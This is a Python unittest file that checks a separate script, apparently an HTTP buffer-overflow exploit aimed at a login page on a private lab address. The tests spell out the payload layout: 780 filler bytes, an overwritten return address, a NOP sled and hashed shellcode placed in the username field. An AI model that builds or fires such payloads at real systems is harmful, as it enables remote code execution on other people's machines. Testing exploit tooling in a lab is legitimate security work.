import io
import hashlib
import importlib
import runpy
import unittest
from contextlib import redirect_stdout
from pathlib import Path
from unittest.mock import Mock, patch


SCRIPT_PATH = Path(__file__).with_name("syn_xpl.py")
EXPECTED_IP = "192.168.100.131"
EXPECTED_URL = f"http://{EXPECTED_IP}/login"
EXPECTED_HEADERS = {
    "Host": EXPECTED_IP,
    "Cache-Control": "max-age=0",
    "Accept-Language": "en-US,en;q=0.9",
    "Origin": f"http://{EXPECTED_IP}",
    "Content-Type": "application/x-www-form-urlencoded",
    "Upgrade-Insecure-Requests": "1",
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "Referer": f"http://{EXPECTED_IP}/login",
    "Accept-Encoding": "gzip, deflate, br",
    "Connection": "keep-alive",
}
EXPECTED_SHELLCODE_LEN = 351
EXPECTED_SHELLCODE_SHA256 = "454de3519303979fd90e38718861e13d0c235cf28b86fb12c357b4a0da0d5d1c"


class SynXplRegressionTests(unittest.TestCase):
    def test_payload_and_constants_integrity(self):
        fake_response = Mock(status_code=200, url="http://example.local/login", text="ok")

        with patch("requests.post", return_value=fake_response):
            module_globals = runpy.run_path(str(SCRIPT_PATH), run_name="__main__")

        shellcode = module_globals["shellcode"]
        payload = module_globals["payload"]
        headers = module_globals["headers"]
        url = module_globals["url"]

        expected_payload = (
            b"username="
            + (b"A" * 780)
            + b"\x83\x0c\x09\x10"
            + (b"\x90" * 16)
            + shellcode
            + b"&password=123456"
        )

        self.assertEqual(url, EXPECTED_URL)
        self.assertEqual(headers, EXPECTED_HEADERS)

        self.assertEqual(len(shellcode), EXPECTED_SHELLCODE_LEN)
        self.assertEqual(hashlib.sha256(shellcode).hexdigest(), EXPECTED_SHELLCODE_SHA256)

        self.assertEqual(payload, expected_payload)

        self.assertTrue(payload.startswith(b"username="))
        self.assertTrue(payload.endswith(b"&password=123456"))

        username_part = payload[len(b"username=") : len(b"username=") + 780]
        eip_part = payload[len(b"username=") + 780 : len(b"username=") + 784]
        nop_part = payload[len(b"username=") + 784 : len(b"username=") + 800]

        self.assertEqual(username_part, b"A" * 780)
        self.assertEqual(eip_part, b"\x83\x0c\x09\x10")
        self.assertEqual(nop_part, b"\x90" * 16)

    def test_network_fields_are_consistent(self):
        fake_response = Mock(status_code=200, url="http://example.local/login", text="ok")

        with patch("requests.post", return_value=fake_response):
            module_globals = runpy.run_path(str(SCRIPT_PATH), run_name="__main__")

        headers = module_globals["headers"]
        url = module_globals["url"]

        self.assertEqual(url, EXPECTED_URL)
        self.assertEqual(headers["Host"], EXPECTED_IP)
        self.assertEqual(headers["Origin"], f"http://{EXPECTED_IP}")
        self.assertEqual(headers["Referer"], EXPECTED_URL)

    def test_request_call_and_success_output(self):
        fake_response = Mock(status_code=302, url="http://example.local/redirect", text="redirected")
        stdout = io.StringIO()

        with patch("requests.post", return_value=fake_response) as mocked_post:
            with redirect_stdout(stdout):
                module_globals = runpy.run_path(str(SCRIPT_PATH), run_name="__main__")

        mocked_post.assert_called_once_with(
            module_globals["url"],
            data=module_globals["payload"],
            headers=module_globals["headers"],
            verify=False,
        )

        output = stdout.getvalue()
        self.assertIn("status: 302", output)
        self.assertIn("url: http://example.local/redirect", output)
        self.assertIn("body:", output)
        self.assertIn("redirected", output)

    def test_request_exception_is_handled(self):
        stdout = io.StringIO()
        requests_module = importlib.import_module("requests")

        with patch("requests.post", side_effect=requests_module.RequestException("timeout")):
            with redirect_stdout(stdout):
                runpy.run_path(str(SCRIPT_PATH), run_name="__main__")

        output = stdout.getvalue()
        self.assertIn("O alvo parou de responder", output)


if __name__ == "__main__":
    unittest.main()